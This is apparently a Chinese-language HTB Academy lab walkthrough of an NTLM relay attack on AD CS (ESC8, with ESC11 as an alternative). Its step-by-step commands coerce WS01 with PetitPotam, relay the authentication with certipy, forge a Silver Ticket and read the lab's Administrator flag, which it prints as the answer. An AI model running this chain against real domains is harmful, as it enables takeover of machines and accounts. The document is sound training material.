# Advanced NTLM Relay Attacks Targeting AD CS

**Module**：HTB Academy — *NTLM Relay Attacks* → Advanced NTLM Relay Attacks Targeting AD CS

**環境**（同 Kerberos 小節）

| 角色 | 主機 | IP |
|---|---|---|
| 攻擊跳板（Linux） | — | SSH `10.129.45.81`，內網 `172.16.117.30` |
| DC + ADCS CA | DC01 | `172.16.117.3` |
| 目標工作站 | WS01 | `172.16.117.50` |

**網域**：`inlanefreight.local`　**低權限帳號**：`inlanefreight\rons` / NT hash `914b011029e6b43cf188d435951831bd`

---

## Q1：用 ESC8 / ESC11 拿下 WS01，讀 Administrator flag

### 1. 列舉 CA 與弱點

```bash
certipy find -u rons@inlanefreight.local -hashes :914b011029e6b43cf188d435951831bd \
  -dc-ip 172.16.117.3 -stdout -vulnerable
```

重點輸出：

```
Certificate Authorities
  CA Name            : INLANEFREIGHT-DC01-CA
  DNS Name           : DC01.INLANEFREIGHT.LOCAL
  Web Enrollment     : Enabled
  Request Disposition: Issue
  Enforce Encryption for Requests : Disabled
  [!] Vulnerabilities
    ESC8  : Web Enrollment is enabled and Request Disposition is set to Issue
    ESC11 : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
```

CA 同時中 **ESC8（HTTP Web Enrollment relay）** 與 **ESC11（ICPR/RPC relay）**。本題走 **ESC8**。

**思路**：coerce WS01 → 它用 `WS01$` 對我們做 SMB 認證 → `certipy relay` 把這個認證 relay 到 CA 的 web enrollment（`http://dc01/certsrv`），用 `Machine` 範本幫 `WS01$` 申請一張憑證 → 用該憑證 PKINIT 拿 `WS01$` 的 TGT 與 NT hash → 以 `WS01$` 身分在 WS01 本機冒充 Administrator → 讀 flag。

> SMB→HTTP 是跨協定 relay：被 coerce 的機器送 SMB 認證，relay 到 HTTP target（web enrollment）不受 SMB 簽章限制，所以**這裡不需要 WebDAV**，PetitPotam 用裸 IP 的 SMB listener 即可。

### 2. 起 ESC8 relay

```bash
sudo tmux new-session -d -s esc8 \
 "stdbuf -oL -eL certipy relay -target http://172.16.117.3 -template Machine > /tmp/esc8.log 2>&1"
# [*] Targeting http://172.16.117.3/certsrv/certfnsh.asp (ESC8)
# [*] Listening on 0.0.0.0:445
```

> `certipy relay` 自己起 SMB(445) listener；`-template Machine` 因為被 relay 的是機器帳號（`$` 結尾）。起之前先把 Kerberos 小節殘留的 `ntlmrelayx`/`Responder` 全部 `pkill` 掉，確保 445 空著。

### 3. coerce WS01（PetitPotam，SMB）

```bash
python3 ~/tools/PetitPotam/PetitPotam.py -d inlanefreight.local -u rons \
  -hashes :914b011029e6b43cf188d435951831bd 172.16.117.30 172.16.117.50
# [+] Attack worked!
```

esc8 log：

```
INLANEFREIGHT\WS01$
[*] Requesting certificate for 'INLANEFREIGHT\WS01$' based on the template 'Machine'
[-] Got error: timed out          # 前幾次逾時，WS01 會重試
...
[*] Got certificate with DNS Host Name 'WS01.INLANEFREIGHT.LOCAL'
[*] Saved certificate and private key to 'ws01.pfx'
```

> 前幾次 `timed out` 是正常的，WS01 的 coerce 會連續重試幾次，最後成功拿到 `ws01.pfx`。

### 4. 憑證 → WS01$ 的 TGT 與 NT hash

```bash
cd /tmp && certipy auth -pfx /tmp/ws01.pfx -dc-ip 172.16.117.3
# [*] Using principal: ws01$@inlanefreight.local
# [*] Got TGT  -> ws01.ccache
# [*] Got hash for 'ws01$@inlanefreight.local':
#     aad3b435b51404eeaad3b435b51404ee:d172f136edc2366d2aa411e92ab6ca01
```

### 5. WS01$ → 本機 Administrator —— **S4U2self 失敗，改用 Silver Ticket**

直覺想用 `getST` 的 S4U（S4U2self + S4U2proxy）冒充 Administrator：

```bash
getST.py -spn cifs/ws01.inlanefreight.local -impersonate Administrator \
  -hashes :d172f136edc2366d2aa411e92ab6ca01 inlanefreight.local/WS01$ -dc-ip 172.16.117.3
# [-] KDC_ERR_BADOPTION: Probably SPN is not allowed to delegate by user WS01$ ...
```

**根因**：這版 impacket 的 `getST.py` 沒有 `-self` 旗標，給 `-impersonate` 時一定會接著做 S4U2proxy；而 `WS01$` 沒有對自己的委派權限，S4U2proxy 必然 `KDC_ERR_BADOPTION`。

**解法**：既然已經有 `WS01$` 的 NT hash，直接**偽造 Silver Ticket**（用機器帳號 hash 離線簽一張 `cifs/ws01` 的 TGS，冒充任意使用者，完全不碰 KDC）。需要 Domain SID：

```bash
lookupsid.py -hashes :914b011029e6b43cf188d435951831bd \
  inlanefreight.local/rons@172.16.117.3 0 | grep -i 'Domain SID'
# Domain SID is: S-1-5-21-1207890233-375443991-2397730614

cd /tmp
ticketer.py -nthash d172f136edc2366d2aa411e92ab6ca01 \
  -domain-sid S-1-5-21-1207890233-375443991-2397730614 \
  -domain inlanefreight.local \
  -spn cifs/ws01.inlanefreight.local Administrator
# -> Administrator.ccache
```

### 6. 讀 flag

```bash
KRB5CCNAME=/tmp/Administrator.ccache smbclient.py -k -no-pass ws01.inlanefreight.local <<'EOF'
use C$
cd Users\Administrator\Desktop
get flag.txt
EOF
```

### ✅ Q1 Answer：`Abusing_ADCS_For_FUN`

---

## 備註：ESC11 的替代打法

若 web enrollment 被關、只剩 ICPR(RPC)，同一條鏈改用 ESC11：

```bash
certipy relay -target rpc://172.16.117.3 -ca INLANEFREIGHT-DC01-CA -template Machine
```

其餘（coerce → `certipy auth` → silver ticket）完全相同。

## 小結

| 步驟 | 工具 | 關鍵 |
|---|---|---|
| 找弱點 | `certipy find -vulnerable` | ESC8/ESC11，Web Enrollment=Enabled |
| relay | `certipy relay -target http://dc` | SMB→HTTP 跨協定，不需 WebDAV |
| coerce | `PetitPotam.py <我方IP> <WS01>` | 裸 IP + SMB 即可 |
| 憑證換身分 | `certipy auth -pfx` | 得 TGT + NT hash |
| 本機提權 | `ticketer.py`（Silver Ticket） | 繞過 S4U2self 缺旗標問題 |

## 清理

```bash
sudo tmux kill-server; sudo pkill -f 'certipy|ntlmrelayx.py|Responder.py'
```
